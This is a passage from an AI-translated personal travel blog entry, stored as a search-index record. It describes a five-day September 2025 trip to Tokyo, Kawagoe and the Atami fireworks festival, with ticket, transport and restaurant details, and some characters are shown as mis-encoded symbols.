Itinerary", "url": "/posts/travel-journals/tokyo-area-travel-guide-kawagoe-little-edo-atami-fireworks-festival-5-day-itinerary-958599363857/", "categories": "Travel Journals", "tags": "life, travel, japan, tokyo, travel-writing, english, ai-translation", "date": "2025-10-10 19:01:28 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2025 Tokyo Area ‚Äî Kawagoe Little Edo and Atami Sea Fireworks Fest...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2025 Tokyo Area ‚Äî Kawagoe Little Edo and Atami Sea Fireworks Festival 5-Day Free Travel5 Days 4 Nights Tokyo City + Suburbs Independent Travel: Complete Guide to Transportation and Experiences for Atami Fireworks Festival and Kawagoe Day TripSummer Fireworks in AtamiTaking advantage of starting a new job, I first fully charged my energy. Revisiting Tokyo ‚Äî experiencing a once-in-a-lifetime Japanese fireworks festival and a day trip to Kawagoe near Tokyo.Last Trip Itinerary Last time, in the ‚Äú[Travelogue] 2023 Tokyo 5-Day Free Trip‚Äù, I visited Tokyo in June 2023. It wasn‚Äôt as hot as in September. The main places I went to were: Tokyo Tower, Shibuya Sky, Skytree, Asakusa Kaminarimon, DisneySea, Yokohama Gundam, Yokohama Cable Car, Odaiba, Shinjuku, and the Imperial Palace. Interested readers can check it out here.Fun Day 1 (09/13 Sat) ‚Äî Arrive in Tokyo, Shibuya, Shibuya Sky Day 2 (09/14) ‚Äî Kawagoe Day Trip, Evening Shopping in Ikebukuro Day 3 (09/15 Mon) ‚Äî Tokyo Station Underground Mall, Atami Fireworks Festival Day 4 (09/16 Tue) ‚Äî Azabudai TeamLab, Harajuku Shopping, Harajuku HARRY Otter Caf√© Day 5 (09/17 Wed) ‚Äî Strolling in Ueno, Return Trip Shibuya Sky Shibuya Sky tickets are very popular, so be sure to purchase them in advance. Official WebsiteSales start time: 11:00 PM Taiwan time. Tickets for entry dates +2 weeks later can be purchased.Please register as a member and familiarize yourself with the purchase process before buying on the official website. The ticket holder‚Äôs name can be a nickname; it does not need to match the passport name exactly. We bought tickets for the 18:40‚Äì18:59 night view slot. You can also choose an earlier time to watch the sunset or the last session at 21:00 after dinner. Other purchase channels: KKday Shibuya SHIBUYA SKY Observatory TicketÔΩúInstant Use Price: ¬•3,400 JPY/personAtami Fireworks FestivalAtami Fireworks Festival official website. 2025 Fireworks Dates: 3/23, 4/20, 4/28, 5/31, 7/25, 8/5, 8/8, 8/18, 8/25, 9/15, 9/23, 10/13, 11/3, 11/24, 12/7, 12/19. Fireworks Time in July and August: 8:15 PM~8:40 PM, 25 minutes Fireworks Time in Other Months: 8:20 PM~8:40 PM, 20 minutes Free entry with no paid seating at the beach release event. It‚Äôs within walking distance from JR Atami Station. For safety, just make sure to book your round-trip JR tickets or accommodation in Atami in advance.It is highly recommended to bring your own picnic mat! It is highly recommended to bring your own picnic mat! It is highly recommended to bring your own picnic mat! We attended the fireworks show on 9/15 at 8:20 PM.Azabudai TeamLab (teamLab Borderless: MORI Building DIGITAL ART MUSEUM) There are quite a lot of tickets, but it is still recommended to purchase them in advance before departure. Other purchase options: Tokyo teamLab Borderless Digital Art Museum Tickets Price: ¬•4,800 JPY/personÔº®Ôº°Ôº≤Ôº≤Ôºπ Harajuku Terrace Otter Caf√©The cafe where you can interact with otters, which I previously saw on Instagram.https://www.instagram.com/p/DPBKurVD99c/ Official Booking There are branches in other areas of Tokyo as well. Check the official website. Booking in advance is recommended, as same-day visits may have no availability. Free cancellation if the itinerary changes before the date. Time: 16:30‚Äì17:30 Price: ¬•3,080 JPY per person for one hour basic fee + ¬•880 per person on-site for 5 minutes of close interaction with otters.But later research showed that another place, „Ç´„ÉØ„Ç¶„ÇΩ_Ëã•Êûó„ÅÆÂÆ∂, seems better with longer interaction time.TravelFlight ‚Äî Japan Airlines Outbound September 13: JL802 Japan Airlines ‚Äî 10:00 TPE Taoyuan International Airport T2 -&gt; 14:25 NRT Narita Airport T2 Return Trip September 17: JL809 Japan Airlines ‚Äî 18:10 NRT Narita Airport T2 -&gt; 18:10 TPE Taoyuan International Airport T2 Price: NT $12,324 per personAlso, Japan Airlines offers a generous checked baggage allowance for economy class: 2 pieces, 23 kg eachJR Shinkansen Tokyo &lt;-&gt; Atami (~= 45 minutes)Because I was worried there might be no trains running that day, I bought the tickets in advance. Sales start time: Tickets for dates +4 weeks later can be purchased at 11:00 PM Taiwan time You can purchase from the official website or through KKday / Klook (compare prices yourself) What we bought: - Tokyo 14:57 -&gt; Atami 15:42 ‚Äî Kodama 735 - Atami 22:02 -&gt; Tokyo 22:48 ‚Äî Kodama 752 Price: NT $1,882 + NT $56 (seat preference fee on booking platform) per personSkyliner Keisei Electric Railway Ticket (~= 41 minutes)This is probably the fastest way to get from Narita Airport to Tokyo city center (Ueno). No unreserved seats available KKday Purchase: Skyliner Keisei Railway Ticket Buying online in advance is cheaper, and you can reserve seats at the station, offering great flexibility. Price: NT $912 (round-trip two tickets) per person Note that when buying a round trip on KKday, you receive two separate tickets. Don‚Äôt mistake this for purchasing the wrong ticket.Kawagoe Pass (Train + Bus) (~= 30 minutes) Tobu Tojo Line round trip: Ikebukuro Station -&gt; Kawagoe Station or Kawagoeshi Station Unlimited rides on Tobu buses all day (including Tobu Koedo Loop Bus) Please note: There are Seibu and Tobu buses; this ticket is for Tobu. KLook Purchase: Kawagoe Discount Pass No need to exchange; just redeem online before use and show the QR code to the train or bus driver. Price: NT $214/personAirport Transfer KKday Airport Transfer Booking / Klook Airport Transfer Booking Currently, both K services offer airport transfers that are affordable, safe, and fast. You can compare prices and choose on your own. Taipei Metro -&gt; Taoyuan Airport Price: NT $752 per uniteSIMAlso purchased the unlimited 5G eSIM directly on KKday. This time, there were no issues or slowdowns while using it in Tokyo, Atami, and Kawagoe. KKday Purchase: Japan eSIM Unlimited Data KDDI / Softbank Price: NT $309 / 5 days / unlimited dataVisit JapanPlease refer to the previous article. Just complete the pre-registration. Currently, the entry inspection and customs inspection QR codes are combined into one.AccommodationBecause the booking time was close to the departure date, after comparing prices and convenience, I chose to stay near Shimbashi Station. (Last time I stayed in Shiodome, but I found Shimbashi more convenient.)Daiwa Roynet Hotel Shimbashi, Tokyo (4 nights)Tokyo Shimbashi Daiwa ROYNET Hotel Also book directly from Klook to earn points About a 2-minute walk from Shimbashi Station, very close. Stay for five days and four nights without changing hotels. Price: NT$ 18,404/4 nights/2 people/standard double room, about NT$ 2,300 per person per night. Ready to go! Let‚Äôs start!You can complete online check-in and seat selection 24 hours before departure, then go straight to check in your luggage at the airport to speed up the process.Day 1 (09/13 Sat) ‚Äî Arrive in Tokyo, Shibuya Sky06:50 Take airport shuttle07:20 Arrive at Taoyuan Airport Terminal 207:30 Pack Luggage and Check-in BaggageAssigned to counter number 1 at the far corner, already completed online check-in, went straight to check in luggage. However, the people ahead took a long time, so it took about 30 minutes to finish the luggage check-in.~= 08:20 Complete security check and immigration clearanceThere were quite a few people early in the morning. I finished security and immigration around 8:20 and went to the second floor to have a Mos Burger for breakfast. The assigned boarding gate was also the farthest one, D1.Terminal 2 Departure Duty-Free Shop Le LaboUnexpectedly found Le Labo at Terminal 2 departure duty-free shop. The sales assistant mentioned a promotion where new members get a coupon, making the 50ml price NT $5,500, cheaper than buying in Japan (about NT $5,800).Latest Price List for 2025 ‚Äî 50ml: Taiwan Store Price: NT $7,600 Taiwan airport store duty-free price: NT $5,500 (promotional price) Tax-refunded price at Japanese stores: about NT $5,700 Japan Airport Store Duty-free price: about NT $5,200 ü§© ‚Äî I bought it this time only after leaving Narita Airport Terminal 2 departure area. While wandering around the airport waiting for boarding, there are two rows of free massage chairs next to D1 The North Face (you can get free tokens from nearby stores to use them).09:40 Head to the gate to prepare for boardingThe plane we took this time was a BOEING 737‚Äì800 model, which is a bit old. But I only found out after returning that the plane offered free one-hour onboard WiFi.10:06 DepartureJAPAN AIRLINES In-flight MealAlthough the plane is a bit old, the in-flight meal was really good: hamburger meat sauce pasta, a small bowl of cold soba noodles with tofu skin, and lemon pudding for dessert (delicious!).14:39 Landed at Narita International Airport, Japan (14 minutes delayed)The floor is a bit damp, and the weather is cloudy. It seems it rained heavily earlier. After arriving, we started the Narita Airport ground game (it takes about 5 minutes to walk from the plane to immigration).~= 15:05 Complete immigration procedures and collect luggage to exit the airportAfter exiting the airport, take the escalator down to the ‚ÄúRailway‚Äù direction. Find the ‚ÄúSKYLINER &amp; KEISEI INFORMATION CENTER‚Äù counter and show the QR code of your pre-purchased Skyliner Keisei Railway ticket to the staff to exchange it for the next available train ticket. Note that there are other railway INFORMATION CENTERS at the station, please make sure to identify the INFORMATION CENTER shown in the picture.Missed the 15:16 train, can only take the 15:42 one.At the station, you can buy Welcome Suica (must be used within 28 days) and use the regular Suica card recharge machines. You can top up the transportation costs needed for this trip while waiting for the train. (But I personally find using Suica on my iPhone very convenient and easy!)Follow the signs for the ‚ÄúKeisei Line‚Äù to enter the station, then find the corresponding platform to wait.~= 15:42 BoardingMany types of trains stop at this platform, so please make sure to confirm before boarding; staff will also announce along the way, and you can show them your ticket for verification. Narita Express is fully reserved seating, no non-reserved seats , do not board without a ticket.The seats on the Narita Express are spacious enough to fit a 28-inch suitcase; if it feels tight, you can place your luggage in the areas in front or behind the car, or on the luggage rack (just be careful when taking it down).The weather is cloudy.16:23 Arrive at Keisei Ueno StationAfter getting off, follow the signs to the underground passage to take the Ginza Line at G station, heading towards Shibuya, then transfer at Ueno-hirokoji to Shimbashi station.16:50 Arrive at Tokyo Shimbashi Daiwa ROYNET HotelJust a short walk from Shimbashi Station, very convenient!The hotel provides a wide range of free amenities, including face masks, bath additives, earplugs, and portable mouthwash, among others.It‚Äôs somewhat like the trip to Hiroshima and Okayama the year before last, staying at the ‚ÄúRifumax Okayama Kurashiki Ekimae Hotel.‚Äù The room was very small, feeling like a single room but with a double bed. The drawbacks, besides being small, include that the room fridge has no freezer function.After dropping off our things, we set off for Shibuya.18:30 Queue to enter Shibuya SKYOn the first floor of Shibuya Scramble Square, find the elevator to the ‚ÄúShibuya SKY‚Äù observation deck. After queuing for the elevator, show your QR code to the ticket inspector to enter the line for admission. (Ticket will be scanned upon entry)You can see the Shibuya Crossing from here. After arrival, first use the free lockers to store your belongings. Selfie sticks and similar items are prohibited. Revisiting Old Places , gained quite a bit of weight compared to two years ago. The escalator has two sides, one going up and one going down, both are great for photos.The rooftop night view, but compared to last time, the weather was worse this time‚Äîfoggy with a light drizzle.After walking all the way down, passing by the bar, the view here is also nice:19:45 Return to Shibuya CrossingCoincidentally, the third season of ‚ÄúAlice in Borderland‚Äù is about to premiere, so let‚Äôs revisit the scenes; it feels like there are many more people than before.Cross the street and head straight to Shibuya Parco, where I want to eat at Gokumiya. Tried it once last time, unforgettable.20:00 Arrive at Shibuya ParcoUnfortunately, Gokumiya was sold out (will come back in a few days), so we tried another kushikatsu shop in the same food court.20:15 Kushikatsu Arata Shibuya ParcoOrdered several signature fried skewers, double meat fried skewers, a bowl of beef brisket rice, and two drinks, totaling ¬•6,340 JPY. The Japanese-style crispy fried skewers are delicious and not greasy, and the braised beef rice is flavorful and filling. Note that the fried skewer shop charges an extra basic cabbage fee („ÅäÈÄö„Åó) , I actually forgot the exact amount, but it should be around ¬• 300 per person.21:30 C-pla ShibuyaOn the way back to the station after eating, I passed by a large C-pla capsule toy shop and went in to explore. Nothing I want to twist here, retreat!Good night! TokyoBought a late-night snack and went back to the hotel to rest.Day 2 (09/14) ‚Äî Kawagoe Day Trip, Shopping in Ikebukuro09:30 Head out and have breakfast at McDonald‚Äôs ‚Äî McDonald‚Äôs Shimbashi Hibiya ExitThe same waffle ham, cheese, and egg burger! I visited this McDonald‚Äôs last time as well. The downside is that it is old, not very clean, and has no self-order kiosks.10:50 Arrive at Ikebukuro Station (Take Yamanote Line)Transfer to the Tobu Tojo Line to go to Kawagoe.We purchased the Kawagoe Pass (Train + Bus) online in advance. The time starts counting once activated online:Go directly to the station office at the side and show your QR code to the staff to enter and exit the station. (No seat reservation needed)11:00 Take the Tobu Tojo Line Kawagoe Express ‚Äî towards Ogawamachi (Saitama Prefecture) ‚Äî via Kawagoe11:26 Arrive at Kawagoe StationAfter exiting from the station office at the far end, I first picked up a tourist brochure and decided to take the bus to the farthest Hikawa Shrine, then walk back while sightseeing.Exit directly from the second-floor pedestrian bridge and go downstairs to the bus boarding area.11:35 Waiting for the bus at Kawagoe Bus StationBoth Platform 1 and Platform 3 have many trains going to Hikawa Shrine. We finally took the Me 01 from Platform 3. As long as you recognize ‚ÄúÊù±Ê≠¶ „Éê„Çπ ‚Äù, use the Kawagoe Pass (Train + Bus) without any special exchange; just show the QR code screen to the driver when getting off. Do not tap your Suica card when boarding if you are using a pass.11:55 Arrive at Hikawa ShrineHikawa ShrineThe shrine is small, with many pinwheels and wind chimes.Doll-style method for removing bad energy:Wind Chime Blessing and Ema AreaSea Bream OmikujiThere are several fish ponds where you can catch your own sea bream omikuji XD I caught the red one, which means a year of safety and good luck.Great luck!If you don‚Äôt have enough coins, you can exchange money with the shrine staff. Volunteers nearby can help translate the fortune for free in English. If you get a bad fortune, just tie it to the shrine to ward off bad luck.12:45 Leave Hikawa ShrineAfter taking some photos and walking around, we left Hikawa Shrine at about 12:45, ready to head to Koedo Street and Kiiikawa MOGUMOGU Honpo Kawagoe branch.Seibu ‚Äî Koedo Loop BusWhile waiting for the train, I saw a cool sightseeing bus with music ‚Äî it was the Seibu Transportation Koedo Loop Bus; Tobu‚Äôs pass cannot be used. You can pay with a transit card or buy the ‚Äú Loop Pass ‚Äú issued by Seibu Railway.13:20 Chiikawa Mogumogu Hompo Kawagoe Âêâ‰ºäÂç°Âìá MOGUMOGU Êú¨Ëàó Â∑ùË∂äÂ∫óThere are many cute babies at the entrance, featuring the sweet potato series exclusive to Kawagoe.Although there is still full-day capacity control, the crowd is not as large as when it first opened. We arrived on-site and scanned the QR code to book the next time slot at 13:40 (there were still available spots); if you want to avoid missing out, you can book online in advance. Yoshikawa MOGUMOGU Main Store Kawagoe Branch Reservation and Pre-Draw Ticket Website (Click Here). Please note: One phone number corresponds to one account, which corresponds to one person. You can only make one reservation per day, per time slot.13:40 Arrive at the store entrance on time to queue for entryThe stock of products is abundant, with some items limited to a maximum purchase quantity per person. You can pay extra to play the capsule toy machine.My Loot: Sweet Potato Bunny has floppy ears and is super cute! Product list and prices can be found on the official website. Large Sweet Potato Bunny: ¬•2,970 JPY / Small Sweet Potato Kiikawa: ¬•1,870 JPYThere are also Miffy and Snoopy specialty storesBought Kawagoe rice crackers and brown sugar sweet potato sticks at the roadside souvenir shop The seafood is delicious; the original flavor is quite firm. The brown sugar sweet potato sticks are like Taiwan‚Äôs brown sugar sweet potato chips but in stick form.After finishing the tour, it was nearly 14:00, and I was really hungry and tired.Former 85th Bank Head Office Main BuildingWalk to a second-floor caf√© in a historic building, grab a quick bite, then continue on. If I weren‚Äôt so hungry and it wasn‚Äôt so late, I would have wanted to queue for soba noodles.After eating, walk out to the terrace to take photos:Here you can get a bird‚Äôs-eye view of Ichibangai shopping street, very beautiful: The terrace is a public area and can be accessed without any purchase.15:30 Toki no Kane (Time Bell Tower)Continue strolling through the Koedo shopping street to the Toki no Kane (Time Bell Tower).Bought takoyaki rice crackers from a nearby stall as a snack.Taisho Romantic Dream Street (Shopping Street)Finally, we passed through Taisho Roman Street and took a bus back to Kawagoe Station, preparing to return to Ikebukuro.16:25 Return to Kawagoe Station, take the Tobu Tojo Line back to Ikebukuro17:10 Ikebukuro Station ParcoAfter returning to Ikebukuro, first explore the department stores at Ikebukuro Station. There are Parco and Tobu Department Store, with many things to browse.Chikawa Cafe (THE GUEST cafe &amp; diner Ikebukuro) „ÄÅ Chikawa Ramen (Chikawa Ramen Pork)Upstairs, there are two Kiikawa restaurants. The caf√© was fully booked when I passed by, but the ramen shop allowed entry with on-site queuing.Next to the line, there is a nearby resale shop where you can buy restaurant series items from Âêâ‰ºäÂç°Âìá:17:45 Gyutan Yaki Sendai Henmi Ikebukuro PARCO BranchApproaching dinner time, we decided to eat at a department store and finally chose to have beef tongue at Parco. Online Menu: Click Here18:00 Draw a ticket for the next day‚Äôs Chiikawa TOKYO Station Giikawa Tokyo Station numbered ticket (want to see the baby series) Ticket reservation website: Click hereLoading converted‚Ä¶ Didn‚Äôt get it QQ, very popular.Start eating after drawing: This shop should have been tried as takeout elsewhere, the beef tongue texture and flavor are very good, and the soup tastes like beef broth and is very tasty!19:00 Shopping in IkebukuroAfter eating, continue shopping.Ikebukuro is also very lively, with many people and plenty of shops.Chiikawa ParkChiikawa Park is also here, but it was already closed since it was late.19:15 Sunshine City ‚Äî Gashapon Ikebukuro Main Store ‚Äî The World‚Äôs Largest Gachapon Shop (3000+ machines)Walked all the way to the world‚Äôs largest capsule toy store to hunt for treasures. In the end, there wasn‚Äôt much to grab. Although there were many machines here, nothing special caught my eye, and the categories were quite messy, making it overwhelming to browse.20:10 Return to Ikebukuro Station ‚Äî Head back to the hotel to restTonight‚Äôs Late-Night Snack:Classic tofu skin instant noodles + convenience store fried chicken + alcohol.Day 3 (09/15 Mon) ‚Äî Tokyo Station First Avenue, Atami Fireworks FestivalPlanning to take the 14:57 Shinkansen to Atami.Highlight of this trip ‚Äî Atami Fireworks Festival; slept in and headed out late in the morning.11:10 Tokyo StationNear noon, first look for food inside the station.There is also a Gokumiya at Tokyo Station, but it gets very crowded. It opens at 11:00, and many people are already lining up by then. It looks like the wait time is about an hour.Turn around and go eat Kobe beef across the street.Kobebeef Daia Tokyo Station Store ‚Äî Á•ûÊà∏Áâõ„ÉÄ„Ç§„Ç¢ Êù±‰∫¨ÈßÖÂ∫ó A nostalgic good taste, last time in Kobe I specially went to eat Kobe beef (Kissho Kichi), the price in Tokyo is about ¬•8,000 JPY more expensive than in Kobe (Prime Kobe beef sirloin 220g Tokyo ¬•39,160 / Kobe ¬•31,600).Just like the nostalgic taste, the meat is tender, with no off-flavors, only the authentic aroma of beef; before I knew it, it was all gone!12:20 Start exploring Tokyo Station Underground First AvenueThe underground mall is very crowded, featuring almost every IP you can think of: Sanrio, One Piece, Jump Store, Rilakkuma, Acorn Republic, Snoopy, Chiikawa, and more.Chiikawa baby Tokyo stationDid not get a numbered ticket, so could only pass by and take photos. The stock seemed abundant, and there were very few people (feels like they controlled the crowd too little?).If you haven‚Äôt had enough shopping, you can visit the neighboring Daimaru Department Store or continue walking to other nearby underground shopping streets.14:00 Tax Refund and Luggage Storage at Tokyo StationFor tax refunds on shopping at Tokyo Station, you can go directly back to the first floor and find the tax refund counter opposite the Tokaido Sanyo Shinkansen Nihombashi Exit.Bought some items, and since the luggage counter closes at 8:00 PM, I looked for coin lockers to store my belongings. There are many lockers available here as well. After dropping off the luggage, I went to the food court to buy some snacks to eat on the way.14:30 Prepare to take the train to AtamiAlso entering from the Nihonbashi exit of the Tokaido Sanyo Shinkansen.For e-tickets purchased in advance on KKday / Klook, there is no need to exchange tickets. Simply scan the QR code on your phone at the blue gate sensor to enter.Entering the station will print out a ticket (for easy information checking or ticket inspection on the train), but entry and exit still require using the mobile QR code.14:57 Depart Tokyo for AtamiA quick snack break.15:42 Arrive at AtamiWelcome to the 2025 Atami Sea Fireworks Festival! Official reminder: The fireworks festival ends with large crowds, so please purchase your Shinkansen tickets in advance.After exiting the Shinkansen, you still need to go through the conventional line ticket gate (just show the staff your ticket QR code to exit).The weather is cloudy, but the good thing is it‚Äôs not too sunny!The Glorious Yakiniku JourneyWalk straight through the shopping street and keep going down to reach the beach.Route as shown in the image, first head to Lawson to buy some food and drinks, then go to the beach for a picnic and wait for the fireworks.The fireworks are launched around the location shown in the above picture. You can walk to Higashikaigancho and wait on the beach further back. You can also go into the water here, and there are shared restrooms and shower facilities nearby for changing. (However, it‚Äôs recommended to check in advance, as some facilities seem worn out.)You can also enjoy a distant view of Atami Castle from Atami Beach.17:00 Atami Sunshine BeachIt doesn‚Äôt feel necessary to arrive in Atami so early; there are fewer people than expected. You can still find beach spots before around 18:30, and even by the 20:20 fireworks display, there are still places available.18:00 Atami Fireworks Festival Beach CrowdYou can see that at 18:00 there are still many seats available, or many people come early to lay down picnic mats to reserve spots and then walk around nearby, returning just before the fireworks start.A little further ahead around the Sky Deck area, there is a small night market selling food (though the cost-performance is not great):There are restrooms around the beach, so you don‚Äôt have to worry about not having access.20:15 Crowds at the beach near the fireworks release timeThere are many people on the trail behind.20:20 Fireworks Festival BeginsThe fireworks had several parts and lasted until 20:40 (20 minutes). My favorite part was the grand display covering the entire sky. Unfortunately, the humidity was high today, so the smoke lingered and didn‚Äôt disperse well towards the end.20:45 Start leaving the venueThere were many people leaving, but everyone moved slowly and orderly toward the station; it was downhill coming in and uphill going back (tiring).21:05 Return to Atami StationIt takes about 20‚Äì25 minutes to walk back to Atami Station due to the crowd, and there are many people entering the station. If you take the local train line, you need to queue and enter slowly. If you have already purchased a Shinkansen ticket, you can directly use the manned gate on the right to pass through and then go up from the local line to board the Shinkansen. Originally worried about tight timing, so I bought the 22:02 train ticket from Atami back to Tokyo; judging by the situation on site, the earlier 21:26 train would have been more than enough.21:20 Arrive at the station and wait for the trainThe Shinkansen here is very spacious and the air conditioning is cool.Bought a can of apple soda to keep going, but heavy rain in other areas caused all trains to be delayed.~=22:25 Board the train (delayed nearly 20 minutes)~= 23:10 Arrive in TokyoTransfer to the Yamanote Line back to Shimbashi.~= 23:40 Return to the hotel to restWhat a fulfilling day!Day 4 (09/16 Tue) ‚Äî Azabudai TeamLab, Harajuku Shopping, Otter Caf√©Well-rested, take the bus out.10:10 Arrive at Azabudai no MoriI thought Azabudai no Mori only had JP Tower, but it turns out it‚Äôs a whole complex of fragmented buildings with many department store counters and dining options.First, go to a caf√© for breakfast and to wake up.10:50 Head to teamLab Borderless: MORI Building DIGITAL ART MUSEUM (Azabudai Hills Garden Plaza B, B1)There is no map inside. If you want to explore everything, you can first get the official guidebook outside.Turn right for a free luggage storage area. After storing your items, show your ticket to the staff to enter.11:00 teamLab BorderlessteamLab is truly amazing, featuring various magical and creative scenes that feel unreal in the real world. The interactions include light and shadow, mirrors, spheres, pillars, leaves, mist, and more. Almost all are 360-degree full scenes, providing a highly immersive experience. No maps are provided, so you need to explore all exhibition rooms on your own. If girls wear skirts and worry about exposure, aprons are thoughtfully provided at the entrance. Before entering each room, staff usually provide instructions, mostly asking visitors not to touch anything and to walk carefully. There are restrooms inside, but you need to find the signs yourself or ask the staff.The photos also look very magical.To have seen something is to have missed seeing something else We left around 12:15, but can‚Äôt guarantee we saw everything; if not for hunger, spending two to three hours inside would not be an issue.HARBS Azabudai Hill StoreAfter visiting teamLab, there is a HARBS right outside. Let‚Äôs have a fruit mille crepe cake to fill our stomach a bit. Online Menu: Click to view.Signature Fruit Mille Crepes (Mille Crepes/„Éü„É´„ÇØ„É¨„Éº„Éó) 1 slice Ôø•1,050 + minimum order of one drink. Inside there is melon (very sweet and delicious) + banana + kiwi.13:20 Tokyo TowerVisited last time and went up (please refer to the previous travelogue) , this time just passed by to take photos.Take the train to Harajuku.14:00 HarajukuRight outside, I saw Kiikawa again and again. On the upper floor of Tokyu Plaza Omotesando Harajuku is the Kiikawa Bakery.Chiikawa Bakery Chiikawa BakeryThe bread and jam shop on the left requires a numbered ticket for entry; the doll merchandise store on the right does not.(Because I just happened to pass by, I didn‚Äôt go in) Click here to join the online queue and get a ticket numberFood: Bakery section.The nearby stores have plenty of stock, but I already have enough sweet potatoes and can‚Äôt buy more, so I just looked around without purchasing.Kiddy Land „Ç≠„Éá„Ç§„É©„É≥„Éâ ÂéüÂÆøÂ∫óAfterward, we visited another nearby Kiddy Land for a stroll. (But this store doesn‚Äôt have Kiikawa)There are many IPs like Snoopy, Sanrio, Pok√©mon, Rilakkuma, and more.By the time we finished strolling around, it was almost 3:00 PM. We had only eaten a slice of fruit mille-feuille for lunch and felt a bit hungry, so we casually picked a highly rated American burger joint we passed by to eat.14:50 The Great BurgerThe specialty is Wagyu mini burgers.The taste is pretty good, but eating too much can be overwhelming.15:40 Shopping in HarajukuAfter eating, continue strolling around Harajuku until evening (16:30) to visit the reserved Otter Caf√©.Just wandered around and ended up at the same Le Labo store where I bought perfume last time. In 2025, the price for 50ml perfume in Japan is ¬•31,350, and after tax refund, it‚Äôs about ¬•28,500.16:30 HARRY HARAJUKU terrace Otter CafeGo to the top floor of this building and take the stairs beside it up.The venue is small, with three outdoor pools where three otters roam around. You can buy snacks to feed them (¬•880). (They will reach out their paws)The coffee is made by the vending machine itself. (Buy 30 minutes and get 1 cup free)The venue itself is not very large. In the middle, there is a paid interactive otter area (extra charge required), next to it is the Totoro interactive area (extra charge required), and on the other side is a free hedgehog interactive area, along with a few otters inside a fenced enclosure.We added ¬•880 per person for a 5-minute close interaction with the otters; otherwise, you actually can‚Äôt touch them.17:20 Otter Petting There were quite a few visitors interacting with the otters, so it wasn‚Äôt our turn until 17:20. The staff kept track of the time.You can gently pet his belly while he‚Äôs eating; the fur is very soft. Overall: The rating might only be around 2.5‚Äì3 stars The overall venue is too small. The basic fee is only ¬•3,080 per person for one hour. Except for the hedgehogs, there is no interaction with other animals, and the coffee is just from a vending machine. Although the staff are quite gentle with the animals, the other otters resting nearby or those in the outdoor pool have very limited space to move, which feels a bit sad. It seems different from the typical size of a regular caf√© and has otters running around.Later research showed another place, „Ç´„ÉØ„Ç¶„ÇΩ_Ëã•Êûó„ÅÆÂÆ∂, seems better with longer interaction time.18:00 Head to Shibuya18:20 Queue at GokumiyaIt‚Äôs still early, so I came to Shibuya again and started with a meal at Gokumiya.At this time, there weren‚Äôt many people, so after a short wait, we were able to get a seat.18:55 Seated at GokumiyaI ate too many hamburger steaks at lunch and felt quite full. I ordered the pure beef steak set on the left, and the juice was delicious. Last time we had the hamburger steak + beef steak set Just remember to bring two pairs of chopsticks: metal chopsticks for grilling and wooden chopsticks for eating.Signature ‚Äî Imari Steak + Gokumiya Hamburger Beef Prices: Small (120g): ¬•2,480 JPY Medium (160g): ¬•2,850 JPY Large (200g): ¬•3,180 JPY Jun Imari Steak Prices: Medium (130g): ¬•2,480 JPY Large (180g): ¬•3,280 JPY Upgrade Package: ¬•450 JPY Multiple soups, salads, and ice cream Personally, I think it‚Äôs just okay. The price is very affordable.Shopping and Buying CosmeticsAt the department store, I browsed the fragrance section and bought two bottles along with a pillow spray to try at home.After eating, we strolled around Shibuya a bit more, then went back to the hotel to get some money and buy cosmetics at a drugstore. After returning to the hotel to rest, we got ready to say goodbye to Tokyo.Ate too much meat, let‚Äôs just have dessert tonight! Also, a colleague bought donuts for us at I‚Äôm donut? Harajuku. (No line in Japan, unlike in Taiwan)Day 5 (09/17 Wed) ‚Äî Ueno Station, Return Trip10:50 Leave before the final check-out timeGoodbye Shinbashi.Take the Yamanote Line to Ueno.11:10 Arrive at Ueno StationDidn‚Äôt explore much, worried about not finding a place to store luggage, so I used the luggage storage counter inside the station. Later found it was not cost-effective because you have to pick up items and pay to enter the station, plus it‚Äôs expensive; the main point is that it‚Äôs out of the way. Later I found out that the Skyliner Keisei Ueno is at Ueno Station Yamashita Exit or Shinobazu Exit You can access it inside the station without going outside in the sun (but it‚Äôs easy to get lost inside the station); to use the lockers there, you need to walk back (about 15 minutes), and there are many coin lockers there as well.Exit here and you‚Äôll be at Ueno Zoo. Turn left, and get ready to reserve your seat for the Skyliner Keisei Ueno.Finally saw the Skyliner Keisei Ueno Station. Since all Skyliner seats are reserved, it is recommended to book your seat early for safety. The station staff can speak Chinese (I just didn‚Äôt realize at first that he was speaking Chinese).Spend the final moments strolling around Ueno.Yodobashi UenoThere is also a second store next door.Walk All the Way to Ueno Marui Department Store for Shopping Across is another exit of Ueno Station. Ueno Station is really huge‚Ä¶The general location is shown in the image above.12:00 Visit Marui Department StoreThere is a gacha capsule toy area to explore on the second floor.Got a Shinkansen ticket capsule toy.I also got hooked and bought a ReFa heart-shaped massage brush at Loft.Ate a croissant here to fill up.13:20 Return to Ueno StationAlso, buy Sugar Butter Tree as a souvenir.Finally, I returned to the Park Exit to pick up my luggage, took a long walk, and then went back to Keisei Ueno.The route is a bit strange; you need to go down to the platform first, then exit from another exit to reach Shinobazu.This underground passage has many coin-operated lockers and is quite spacious.I reluctantly said crossing the street leads to Skyliner Keisei Ueno. (Not sure if there‚Äôs a closer exit, didn‚Äôt wander around to avoid getting lost)14:10 Return to Skyliner Keisei Ueno, prepare to take the train to Narita Airport14:20 Depart for Narita AirportJust stopped by a convenience store on the way to buy some food and drinks to recharge.15:03 Arrive at Narita Airport Terminal 2Once you go straight up, you will reach the international departures. I originally planned to eat at the newly opened Shake Shack burger at Terminal 1 Êñ∞ÈñãÂπïÁöÑ Shake Shack Êº¢Â†°, but I was too tired to go.15:40 Completed check-in You can check in and select seats online 24 hours before departure, then go straight to baggage drop-off at the airport to speed up the process.After checking in my luggage, I went straight to line up for immigration (tired).16:00 Complete security check and immigration clearanceWalk towards the smaller numbers to reach the central connecting hall, where you can find food and shopping.First, go to JAPAN FOOD HALL B1 to grab something to eat16:25 Snack Time Ordered a tempura shrimp soba with draft beer. Actual cost: 955 TWD (Airport prices are just 